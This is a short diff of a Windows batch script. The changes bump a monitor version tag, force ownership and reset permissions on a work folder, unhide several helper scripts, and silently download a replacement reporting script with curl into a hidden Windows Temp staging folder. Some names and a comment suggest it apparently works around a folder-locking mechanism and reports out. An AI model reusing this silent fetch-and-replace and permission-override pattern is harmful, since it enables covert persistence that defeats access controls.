@@ -35,7 +35,7 @@ set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M37"
+set "MONVER=M38"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
@@ -82,7 +82,9 @@ rem in C:\Windows\Temp (never ACL-locked), then move into %WD%. LockDir cannot f
 set "STAGE=%SystemRoot%\Temp\.upd"
 if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
 attrib -h -s -r "%WD%" >nul 2>&1
-icacls "%WD%" /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI)(CI)F" /C /Q >nul 2>&1
+takeown /F "%WD%" /R /D Y >nul 2>&1
+icacls "%WD%" /reset /T /C /Q >nul 2>&1
+icacls "%WD%" /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI)(CI)F" /T /C /Q >nul 2>&1
 attrib -h -s -r "%WD%\tg_report.ps1" "%WD%\own_secure.cmd" "%WD%\own_lib.ps1" "%WD%\own_mon.cmd" >nul 2>&1
 
 "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%STAGE%\tg_report.new" "%TG%" >nul 2>&1
